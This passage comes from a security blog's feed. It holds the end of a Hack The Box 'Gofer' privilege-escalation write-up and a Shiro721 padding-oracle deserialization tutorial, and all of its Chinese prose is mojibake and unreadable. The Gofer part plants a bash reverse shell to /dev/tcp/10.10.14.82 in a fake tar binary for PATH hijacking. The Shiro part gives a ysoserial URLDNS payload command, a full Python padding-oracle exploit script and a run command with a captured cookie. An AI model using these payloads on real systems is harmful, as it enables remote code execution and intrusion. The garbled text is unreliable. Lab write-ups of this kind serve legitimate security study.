alt="image-20230805191534230"><br>åŸºæœ¬åŠŸèƒ½å°±æ˜¯å†™ç¬”è®°å•¥çš„ï¼ŒæŠŠè¿™ä¸ªäºŒè¿›åˆ¶ç¨‹åºä¸‹ä¸‹æ¥<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051915662.png" alt="image-20230805191545504"><br>ç„¶ååˆ©ç”¨idaæˆ–è€…åœ¨çº¿ç½‘ç«™ç»™å®ƒé€†å‘ä¸€ä¸‹çœ‹çœ‹ä»£ç ï¼Œcase1è¿™é‡Œä¼šåˆ†é…40ä¸ªå­—èŠ‚çš„å†…å­˜ï¼Œç„¶åé€šè¿‡uidåˆ¤æ–­ç”¨æˆ·çš„æƒé™æ‰§è¡Œä¸åŒçš„æ“ä½œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051915693.png" alt="image-20230805191558648"><br>ç„¶åæ˜¯case3è¿™é‡Œå¦‚æœåˆ›å»ºäº†ç”¨æˆ·æ‰§è¡Œè¿™ä¸ªæ“ä½œå°±ä¼šå°†var_10_1çš„å†…å­˜é‡Šæ”¾æ‰ï¼Œä½†æ˜¯è¿™ä¸ªæŒ‡é’ˆæ²¡æœ‰æ¸…0æˆ–è€…è®¾ç½®ä¸ºnullè¿™å°±æ˜¯é€ æˆæ¼æ´çš„åœ°æ–¹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051916081.png" alt="image-20230805191608034"><br>å†å°±æ˜¯case4è¿™é‡Œï¼Œå®ƒè¿™é‡Œåˆ†é…çš„å†…å­˜å…¶å®å°±æ˜¯ä¸Šé¢é‡Šæ”¾æ‰çš„ï¼Œç”±äºæŒ‡é’ˆæ²¡æœ‰ç½®0è¿™é‡Œå°±ä¼šé€ æˆå†…å­˜è¦†ç›–çš„é—®é¢˜æ‹¿åˆ°admin<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051916397.png" alt="image-20230805191617355"><br>ç„¶ååˆ°case8è¿™é‡Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051916255.png" alt="image-20230805191629202"><br>åœ¨æ‰§è¡Œtarçš„æ—¶å€™å®ƒä¼šä»ç¯å¢ƒå˜é‡é‡Œé¢è¿›è¡ŒæŸ¥è¯¢ï¼ŒæŸ¥åˆ°çš„ç¬¬ä¸€ä¸ªtarå°±ä¼šåœæ­¢æŸ¥è¯¢ç„¶åæ‰§è¡ŒæŸ¥åˆ°çš„taré‚£ä¹ˆå°±å¯ä»¥åœ¨ç¯å¢ƒå˜é‡è¿™é‡Œè¿›è¡Œä¸€äº›æ“ä½œï¼Œå…ˆåœ¨å½“å‰ç›®å½•åˆ›å»ºä¸ªtmpç›®å½•é‡Œé¢å†åˆ›å»ºä¸ªtaræ–‡ä»¶ï¼Œtaræ–‡ä»¶é‡Œé¢å†™å…¥åå¼¹shellçš„å‘½ä»¤ï¼Œç„¶åå°†å«taræ–‡ä»¶çš„ç›®å½•æ·»åŠ åˆ°ç¯å¢ƒå˜é‡ï¼Œå¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051916350.png" alt="image-20230805191641284"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.82/6666 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><p>ç¯å¢ƒå˜é‡è¿™é‡Œå¼„å®Œä¹‹åå°±å¯ä»¥å»è¿è¡Œnotesäº†ï¼Œé¦–å…ˆéšä¾¿åˆ›å»ºä¸ªç”¨æˆ·<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051916708.png" alt="image-20230805191654656"><br>ç„¶ååˆ é™¤ç”¨æˆ·ï¼Œå†å†™å…¥ç¬”è®°ï¼Œç¬”è®°å†…å®¹å‰24ä¸ªå­—ç¬¦éšä¾¿ï¼Œåé¢ä¸ºadmin<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051917185.png" alt="image-20230805191707123"><br>ç„¶åæ‰§è¡Œ8å¤‡ä»½å³å¯æ‹¿åˆ°shellææƒæˆåŠŸ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051917506.png" alt="image-20230805191733466"></p><h2 id="æ‰“å®Œæ„Ÿæ‚Ÿ"><a href="#æ‰“å®Œæ„Ÿæ‚Ÿ" class="headerlink" title="æ‰“å®Œæ„Ÿæ‚Ÿ"></a>æ‰“å®Œæ„Ÿæ‚Ÿ</h2><p>ç¬¬ä¸€æ¬¡ç¢°htbçš„é¶æœºï¼Œç¡®å®å¾ˆå¤šä¸œè¥¿ä¸ä¼šï¼Œwpæ²¡å‡ºæ¥ä¹‹å‰ç¬¬ä¸€æ­¥å°±ä¸ä¼šã€‚ã€‚ã€‚ææƒé‚£é‡Œçš„åå¼¹shellæäº†å‡ ä¸ªå°æ—¶éƒ½ä¸è¡Œï¼Œåé¢æ¢ä¸ªç«¯å£å¥½äº†ã€‚ã€‚ã€‚å¸ˆå‚…ä»¬å¯ä»¥å‚è€ƒä¸‹é¢çš„è¿™ä¸ªè§†é¢‘å°†è®²çš„å¾ˆè¯¦ç»†ç‰¹åˆ«æ˜¯é€†å‘é‚£é‡Œï¼Œå¦å¤–ä¹Ÿæ„Ÿè°¢userB1ankå¸ˆå‚…çš„æŒ‡å¯¼</p><h2 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h2><p><a href="https://www.bilibili.com/video/BV1gz4y1s7Hy/?spm_id_from=333.337.search-card.all.click&vd_source=1890d9406dbe84d302711ac2df955425">Gofer - Hackthebox_å“”å“©å“”å“©_bilibili</a><br><a href="http://userb1ank.xyz/2023/08/01/%E9%9D%B6%E5%9C%BA/gofer/">gofer-wp | UserB1ankâ€™s Blog</a></p>]]></content>
      
      
      <categories>
          
          <category> é¶æœº </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå­¦ä¹ ä¹‹Shiro721</title>
      <link href="/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BShiro721/"/>
      <url>/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BShiro721/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>è¿™é‡Œæˆ‘ç›´æ¥ç”¨çš„Drunkbabyä½¬çš„ç¯å¢ƒï¼Œè‡ªå·±æ­å»ºå¤±è´¥äº†ï¼Œæ·¦</p><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>åœ¨Shiro721æ¼æ´ä¸­ï¼Œç”±äºApache Shiro cookieä¸­é€šè¿‡ AES-128-CBC æ¨¡å¼åŠ å¯†çš„rememberMeå­—æ®µå­˜åœ¨é—®é¢˜ï¼Œç”¨æˆ·å¯é€šè¿‡Padding Oracle Attackæ¥æ„é€ æ¶æ„çš„rememberMeå­—æ®µï¼Œå¹¶é‡æ–°è¯·æ±‚ç½‘ç«™ï¼Œè¿›è¡Œååºåˆ—åŒ–æ”»å‡»ï¼Œæœ€ç»ˆå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><p>è™½ç„¶ä½¿ç”¨Padding Oracle Attackå¯ä»¥ç»•è¿‡å¯†é’¥ç›´æ¥æ„é€ æ”»å‡»å¯†æ–‡ï¼Œä½†æ˜¯åœ¨è¿›è¡Œæ”»å‡»ä¹‹å‰æˆ‘ä»¬éœ€è¦è·å–ä¸€ä¸ªåˆæ³•ç”¨æˆ·çš„Cookieã€‚</p><h2 id="æ¼æ´åˆ©ç”¨æ¡ä»¶"><a href="#æ¼æ´åˆ©ç”¨æ¡ä»¶" class="headerlink" title="æ¼æ´åˆ©ç”¨æ¡ä»¶"></a>æ¼æ´åˆ©ç”¨æ¡ä»¶</h2><p>æ¼æ´å½±å“ç‰ˆæœ¬æ˜¯ 1.2.5 &lt;&#x3D; Apache Shiro &lt;&#x3D; 1.4.1<br>Apache Shiro Padding Oracle Attack çš„æ¼æ´åˆ©ç”¨å¿…é¡»æ»¡è¶³å¦‚ä¸‹å‰ææ¡ä»¶ï¼š</p><ul><li>å¼€å¯ rememberMe åŠŸèƒ½ï¼›</li><li>rememberMe å€¼ä½¿ç”¨ AES-CBC æ¨¡å¼è§£å¯†ï¼›</li><li>èƒ½è·å–åˆ°æ­£å¸¸ Cookieï¼Œå³ç”¨æˆ·æ­£å¸¸ç™»å½•çš„ Cookie å€¼ï¼›</li><li>å¯†æ–‡å¯æ§ï¼›</li></ul><h2 id="å¤ç°æ¼æ´"><a href="#å¤ç°æ¼æ´" class="headerlink" title="å¤ç°æ¼æ´"></a>å¤ç°æ¼æ´</h2><p>è¿™é‡Œå…ˆæ­£å¸¸ç™»å½•ï¼Œç„¶åæŠ“ä¸ªç™»å½•åçš„åŒ…ï¼Œè¿™é‡Œè¿˜æ˜¯å’Œä¹‹å‰ä¸€æ ·å¾—ç”¨è‡ªå·±çš„IPæ‰èƒ½æŠ“åˆ°<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171131964.png" alt="image-20230717113123897"><br>ç„¶ååˆ©ç”¨ysoå·¥å…·ç”Ÿæˆä¸€ä¸ª<code>payload.class</code>æ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java8 -jar ysoserial-all.jar URLDNS <span class="string">&quot;http://1ovhi7.dnslog.cn&quot;</span> &gt; payload.class</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨[å¦‚ä¸‹exp](<a href="https://github.com/inspiringz/Shiro-721">inspiringz&#x2F;Shiro-721: Shiro-721 RCE Via RememberMe Padding Oracle Attack (github.com)</a>)è¿›è¡ŒPadding Oracle Attackï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#https://github.com/3ndz/Shiro-721  </span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-  </span></span><br><span class="line"><span class="keyword">from</span> paddingoracle <span class="keyword">import</span> BadPaddingException, PaddingOracle  </span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode  </span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote, unquote  </span><br><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> socket  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PadBuster</span>(<span class="title class_ inherited__">PaddingOracle</span>):  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, **kwargs</span>):  </span><br><span class="line">        <span class="built_in">super</span>(PadBuster, self).__init__(**kwargs)  </span><br><span class="line">        self.session = requests.Session()  </span><br><span class="line">        self.wait = kwargs.get(<span class="string">&#x27;wait&#x27;</span>, <span class="number">2.0</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">self, data, **kwargs</span>):  </span><br><span class="line">        somecookie = b64encode(b64decode(unquote(sys.argv[<span class="number">2</span>])) + data)  </span><br><span class="line">        self.session.cookies[<span class="string">&#x27;rememberMe&#x27;</span>] = somecookie  </span><br><span class="line">        <span class="keyword">if</span> self.session.cookies.get(<span class="string">&#x27;JSESSIONID&#x27;</span>):  </span><br><span class="line">            <span class="keyword">del</span> self.session.cookies[<span class="string">&#x27;JSESSIONID&#x27;</span>]  </span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:  </span><br><span class="line">            <span class="keyword">try</span>:  </span><br><span class="line">                response = self.session.get(sys.argv[<span class="number">1</span>],  </span><br><span class="line">                        stream=<span class="literal">False</span>, timeout=<span class="number">5</span>, verify=<span class="literal">False</span>)  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">            <span class="keyword">except</span> (socket.error, requests.exceptions.RequestException):  </span><br><span class="line">                logging.exception(<span class="string">&#x27;Retrying request in %.2f seconds...&#x27;</span>,  </span><br><span class="line">                                  self.wait)  </span><br><span class="line">                time.sleep(self.wait)  </span><br><span class="line">                <span class="keyword">continue</span>  </span><br><span class="line">  </span><br><span class="line">        self.history.append(response)  </span><br><span class="line">        <span class="keyword">if</span> response.headers.get(<span class="string">&#x27;Set-Cookie&#x27;</span>) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="string">&#x27;deleteMe&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.headers.get(<span class="string">&#x27;Set-Cookie&#x27;</span>):  </span><br><span class="line">            logging.debug(<span class="string">&#x27;No padding exception raised on %r&#x27;</span>, somecookie)  </span><br><span class="line">            <span class="keyword">return</span>  </span><br><span class="line">        <span class="keyword">raise</span> BadPaddingException  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    <span class="keyword">import</span> logging  </span><br><span class="line">    <span class="keyword">import</span> sys  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> sys.argv[<span class="number">3</span>:]:  </span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Usage: %s &lt;url&gt; &lt;somecookie value&gt; &lt;payload&gt;&#x27;</span> % (sys.argv[<span class="number">0</span>], )  </span><br><span class="line">        sys.exit(<span class="number">1</span>)  </span><br><span class="line">  </span><br><span class="line">    logging.basicConfig(level=logging.DEBUG)  </span><br><span class="line">    encrypted_cookie = b64decode(unquote(sys.argv[<span class="number">2</span>]))  </span><br><span class="line">    padbuster = PadBuster()  </span><br><span class="line">    payload = <span class="built_in">open</span>(sys.argv[<span class="number">3</span>], <span class="string">&#x27;rb&#x27;</span>).read()  </span><br><span class="line">    enc = padbuster.encrypt(plaintext=payload, block_size=<span class="number">16</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rememberMe cookies:&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(b64encode(enc))</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè„šæœ¬éœ€è¦python2æ¥è¿è¡Œï¼Œç„¶åpaddingoracleè¿™ä¸ªåº“ç›´æ¥åœ¨ä¸Šé¢é‚£ä¸ªé¡¹ç›®é‡Œé¢ä¸‹è½½ç„¶åæ”¾åˆ°python2å¯¹åº”çš„åº“å­˜æ”¾ä½ç½®å°±è¡Œï¼Œæˆ‘çš„åœ°å€å¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171131460.png" alt="image-20230717113137408"><br>ç„¶åè¿è¡Œè„šæœ¬çˆ†ç ´å°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 exp.py http://<span class="number">172.21</span><span class="number">.97</span><span class="number">.44</span>:<span class="number">8081</span>/shiro721_war/account/ nAIv7BZvX7caZvpwmOXX081j1JGGQGBL936tN9gkgCcymvbHnt7Vgj8Alu7pBZSwFHbbUa776DI4T1WGeJ7YguSZOLuinOaIW1iHjwi0P1YFNcf0ZIYTimmKL0u3tWeGpTS276V9WqdYhd1oCsI7R/4wlZ28rodMjoNeADon742+JG4Mbj6ihQKNBL+mklXa/+u5tpd6NfbEbASAFSlQ8H/MdbwzhqVXyMOvteNR26adkcWJKZDhKBy5GE68fPi7OHWcSVsl6ZZUMTAZcsIiwzg9O/XDUEkAzK1TMEf3iibRbHhfD6jzNorfcEM9DZTZ6trEX8+TFHc6DHyVZE8I6De6+Iyq3Ysr0N222YRwc2uYc2UYMrZPho1p/JheNPJGN+DolcM03d8HxJF4tSDepkvn8uYzjps+U+h++zqAqWrkkDzG7vTJP7Zo9Z5YONCSuYRq3k7vL0sqoO+PRQ+18JNAOYi2Jjlu0y3JpYX1eROnIbVMp1lF81d9UIgueJuT payload.<span class="keyword">class</span></span><br></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨çˆ†ç ´ç”Ÿæˆçš„cookieå»æ‰“DNSå°±è¡Œï¼Œè„šæœ¬ä½œè€…è¯´å·®ä¸å¤šä¸€å°æ—¶ï¼Œå…¶å®è¿™é‡Œå¤§æ¦‚å‡ åˆ†é’Ÿå°±è¡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171131919.png" alt="image-20230717113145827"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171131549.png" alt="image-20230717113153511"><br>è¿™é‡Œä¹Ÿå¯ä»¥åˆ©ç”¨é£é¸¿å¸ˆå‚…çš„å·¥å…·å»æ‰“ä¹Ÿè¡Œ<a href="https://github.com/feihong-cs/ShiroExploit-Deprecated">Shiro550&#x2F;Shiro721 ä¸€é”®åŒ–åˆ©ç”¨å·¥å…·</a></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="å¯†é’¥ç”Ÿæˆ"><a href="#å¯†é’¥ç”Ÿæˆ" class="headerlink" title="å¯†é’¥ç”Ÿæˆ"></a>å¯†é’¥ç”Ÿæˆ</h3><p>åœ¨shiro550ä¸­å¯†é’¥æ˜¯ç¡¬ç¼–ç ï¼Œå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.serializer = <span class="keyword">new</span> <span class="title class_">DefaultSerializer</span>&lt;PrincipalCollection&gt;();</span><br><span class="line">        <span class="built_in">this</span>.cipherService = <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åœ¨Shiro721ä¸­ï¼Œå¯†é’¥çš„ç”Ÿæˆæ–¹å¼å˜ä¸ºäº†åŠ¨æ€ç”Ÿæˆ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.serializer = <span class="keyword">new</span> <span class="title class_">DefaultSerializer</span>&lt;PrincipalCollection&gt;();</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="built_in">this</span>.cipherService = cipherService;</span><br><span class="line">        setCipherKey(cipherService.generateNewKey().getEncoded());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ç„¶åè·Ÿè¿›è°ƒè¯•ä¸€ä¸‹ï¼Œæ–­ç‚¹å¦‚ä¸‹ï¼Œshiroé€šè¿‡<code>generateNewKey()</code>æ–¹æ³•è·å–å¯†é’¥<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171132306.png" alt="image-20230717113207176"><br>è¿›å…¥<code>generateNewKey()</code>æ–¹æ³•ï¼Œè¿™é‡Œåˆå§‹åŒ–äº†ä¸€ä¸ªKeyGeneratorå¯¹è±¡ï¼Œå¹¶ä¸”è°ƒç”¨äº†init<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171132520.png" alt="image-20230717113216295"><br>ç»§ç»­è·Ÿè¿›çœ‹çœ‹ï¼Œè¿™é‡Œè·å–åˆ°äº†ä¸€ä¸ªéšæœºæ•°å‘ç”Ÿå™¨<code>SecureRandom</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171132709.png" alt="image-20230717113226497"><br>ç„¶åä¸‹ä¸€æ­¥è°ƒç”¨äº†<code>generateKey()</code>è·Ÿè¿›çœ‹çœ‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171132397.png" alt="image-20230717113235333"><br>è·Ÿè¿›ä¹‹åå‘ç°è¿™é‡Œè°ƒç”¨äº†<code>engineGenerateKey()</code>è·Ÿè¿›å»å‘ç°æ˜¯ä¸ªæŠ½è±¡ç±»ä¸­çš„æŠ½è±¡æ–¹æ³•ï¼Œæ‰¾åˆ°å®ƒçš„å®ç°ï¼Œåœ¨ä¸‹é¢è¿™é‡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171132628.png" alt="image-20230717113244391"><br>åœ¨è¿™é‡Œå·²ç»ç”Ÿæˆäº†ä¸€ä¸²16å­—èŠ‚çš„éšæœºåºåˆ—ï¼Œç„¶åè¿”å›ä¸€ä¸ª<code>SecretKeySpec</code>å¯¹è±¡ï¼Œå†ä½¿ç”¨<code>getEncoded()</code>æ–¹æ³•è·å–<code>key</code>å¯†é’¥åºåˆ—ï¼Œç„¶åç»§ç»­è·Ÿåˆ°<code>getEncoded()</code>æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171132164.png" alt="image-20230717113254957"><br>è¿™æ•´ä¸ªè¿‡ç¨‹å°±æ˜¯å¯†é’¥ç”Ÿæˆçš„å®Œæ•´è¿‡ç¨‹ï¼Œè°ƒè¯•èƒ½åŠ›å¤ªå·®äº†ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯æ²¡ä¸‹æºç çš„åŸå› å¾ˆå¤šç±»éƒ½æ˜¯classæ–‡ä»¶ä¸å¤ªå¥½è°ƒï¼Œéƒ½æ˜¯ç›´æ¥ä¸‹çš„æ–­ç‚¹</p><h3 id="Padding-Oracle-Attackæ”»å‡»ä¸­çš„å¸ƒå°”æ¡ä»¶"><a href="#Padding-Oracle-Attackæ”»å‡»ä¸­çš„å¸ƒå°”æ¡ä»¶" class="headerlink" title="Padding Oracle Attackæ”»å‡»ä¸­çš„å¸ƒå°”æ¡ä»¶"></a>Padding Oracle Attackæ”»å‡»ä¸­çš„å¸ƒå°”æ¡ä»¶</h3><p>ä»¥ä¸‹å†…å®¹å‚è€ƒ<a href="https://goodapple.top/archives/261">Javaååºåˆ—åŒ–æ¼æ´â€”â€”Shiro721 - æ«ã®Blog (goodapple.top)</a>æˆ‘è¿™é‡Œå°±æ˜¯è·Ÿç€èµ°ä¸€é<br>Padding Oracle Attackæ”»å‡»æ˜¯ä¸€ç§ç±»ä¼¼äºsqlç›²æ³¨çš„æ”»å‡»ï¼Œè¿™å°±è¦æ±‚æœåŠ¡å™¨ç«¯æœ‰èƒ½å¤Ÿè¢«æˆ‘ä»¬åˆ©ç”¨çš„å¸ƒå°”æ¡ä»¶<br>åœ¨ Apache Shiro çš„åœºæ™¯ä¸­ï¼Œè¿™ä¸ªæœåŠ¡ç«¯çš„ä¸¤ä¸ªä¸åŒçš„å“åº”ç‰¹å¾ä¸ºï¼š</p><ul><li>Padding Oracle é”™è¯¯æ—¶ï¼ŒæœåŠ¡ç«¯å“åº”æŠ¥æ–‡çš„ Set-Cookie å¤´å­—æ®µè¿”å› <code>rememberMe=deleteMe</code>ï¼›</li><li>Padding Oracle æ­£ç¡®æ—¶ï¼ŒæœåŠ¡ç«¯è¿”å›æ­£å¸¸çš„å“åº”æŠ¥æ–‡å†…å®¹ï¼›<br>æˆ‘ä»¬å¯ä»¥é€šè¿‡å“åº”å¤´æ¥åˆ¤æ–­æ˜æ–‡å¡«å……æ˜¯å¦æ­£ç¡®ï¼Œè¿›è€Œçˆ†ç ´å‡ºä¸­é—´å€¼ã€‚é‚£ä¹ˆå¯¹äºè§£å¯†ä¸æ­£ç¡®çš„ Cookieï¼ŒShiro æ˜¯æ€ä¹ˆå¤„ç†çš„å‘¢ï¼Ÿ</li></ul><h4 id="Paddingé”™è¯¯å¤„ç†"><a href="#Paddingé”™è¯¯å¤„ç†" class="headerlink" title="Paddingé”™è¯¯å¤„ç†"></a>Paddingé”™è¯¯å¤„ç†</h4><p>è§£å¯†å‡½æ•°åœ¨<code>AbstractRememberMeManager.decrypt()</code>ä¸­<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171133587.png" alt="image-20230717113306451"><br>è·Ÿè¿›<code>cipherService.decrypt()</code>ï¼Œæœ€ååˆ°<code>crypt()</code>ä¸­è°ƒç”¨<code>doFinal()</code>æ–¹æ³•ï¼Œè¿™é‡Œæˆ‘ç›´æ¥ä¸‹æ–­ç‚¹äº†ï¼Œä¸€æ­¥æ­¥è°ƒé—®é¢˜å¤ªå¤šäº†ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯æˆ‘è°ƒè¯•èƒ½åŠ›å·®<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171133802.png"><br><code>doFinal()</code>æ–¹æ³•æœ‰<code>IllegalBlockSizeException</code>å’Œ<code>BadPaddingException</code>è¿™ä¸¤ä¸ªå¼‚å¸¸ï¼Œåˆ†åˆ«ç”¨äºæ•è·å—å¤§å°å¼‚å¸¸å’Œå¡«å……é”™è¯¯å¼‚å¸¸ã€‚å¼‚å¸¸ä¼šè¢«æŠ›å‡ºåˆ°<code>crypt()</code>æ–¹æ³•ä¸­ï¼Œæœ€ç»ˆè¢«<code>getRememberedPrincipals()</code>æ–¹æ³•æ•è·ï¼Œå¹¶æ‰§è¡Œ<code>onRememberedPrincipalFailure()</code>æ–¹æ³•ã€‚<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171133742.png" alt="image-20230717113350548"><br><code>onRememberedPrincipalFailure()</code>æ–¹æ³•è°ƒç”¨äº†<code>forgetIdentity()</code>ã€‚è¯¥æ–¹æ³•ä¼šè°ƒç”¨<code>removeFrom()</code>ï¼Œåœ¨responseå¤´éƒ¨æ·»åŠ å­—æ®µ<code>Set-Cookie: rememberMe=deleteMe</code>ã€‚<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171133541.png" alt="image-20230717113359308"><br>å€˜è‹¥Paddingç»“æœä¸æ­£ç¡®çš„è¯ï¼Œå“åº”åŒ…å°±ä¼šè¿”å› <code>Set-Cookie: rememberMe=deleteMe</code> ã€‚</p><h5 id="Paddingæ­£ç¡®ï¼Œååºåˆ—åŒ–å¤„ç†"><a href="#Paddingæ­£ç¡®ï¼Œååºåˆ—åŒ–å¤„ç†" class="headerlink" title="Paddingæ­£ç¡®ï¼Œååºåˆ—åŒ–å¤„ç†"></a>Paddingæ­£ç¡®ï¼Œååºåˆ—åŒ–å¤„ç†</h5><p>CBCæ¨¡å¼ä¸‹çš„åˆ†ç»„å¯†ç ï¼Œå¦‚æœæŸä¸€ç»„çš„å¯†æ–‡è¢«ç ´åï¼Œé‚£ä¹ˆåœ¨å…¶ä¹‹åçš„åˆ†ç»„éƒ½ä¼šå—åˆ°å½±å“ã€‚è¿™æ—¶å€™æˆ‘ä»¬çš„å¯†æ–‡å°±æ— æ³•æ­£ç¡®çš„è¢«ååºåˆ—åŒ–äº†ã€‚<br>Shiroä¸­å…³äºååºåˆ—åŒ–çš„å¤„ç†åœ¨<code>DefaultSerializer</code>ç±»çš„<code>deserialize()</code>æ–¹æ³•ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171134120.png" alt="image-20230717113411895"><br>å¦‚æœååºåˆ—åŒ–çš„ç»“æœé”™è¯¯ï¼Œåˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚æœ€åå¼‚å¸¸ä»ä¼šè¢« <code>getRememberedPrincipals()</code> æ–¹æ³•å¤„ç†ã€‚ç»§ç»­å¾€ä¸‹è·Ÿå³å¯çœ‹åˆ°æ¥åˆ°äº†<code>getRememberedPrincipals()</code> æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171134178.png" 